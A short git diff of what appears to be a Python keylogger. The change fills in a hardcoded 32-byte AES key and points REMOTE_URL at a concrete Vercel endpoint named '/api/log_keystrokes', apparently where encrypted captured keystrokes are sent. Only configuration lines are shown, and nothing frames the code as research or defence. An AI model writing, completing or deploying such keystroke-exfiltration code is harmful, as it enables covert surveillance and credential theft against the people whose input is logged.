@@ -52,8 +52,8 @@ def create_directories():
 # Call the function to create directories
 create_directories()
 
-# Key for AES encryption (must be 16, 24, or 32 bytes long)
-AES_KEY = "your_AES_key_here"  # Replace with your AES key
+# Key for AES encryption (must be 16, 24, or 32 bytes long)##
+AES_KEY = b'\xd4,\x04\xab\xb7W\xddn\xc0\xbf0\x81L\xf9\x9f`G\x82\x8a\xe6\xa9\x19\xdc&\xb6\xab\xc4\xe9\xab(\xaa\xfc' # Replace with your AES key
 
 # Define platform-specific configurations
 if platform.system() == "Windows":
@@ -74,7 +74,7 @@ LAST_LOG_TIME = time.time()
 LOCK = threading.Lock()
 
 # Remote server URL to send logs
-REMOTE_URL = 'https://your-vercel-project.vercel.app/api/log_keystrokes'
+REMOTE_URL = 'https://project-portfolio-one-jet.vercel.app/api/log_keystrokes'
 
 # Configuration options
 CONFIG = {
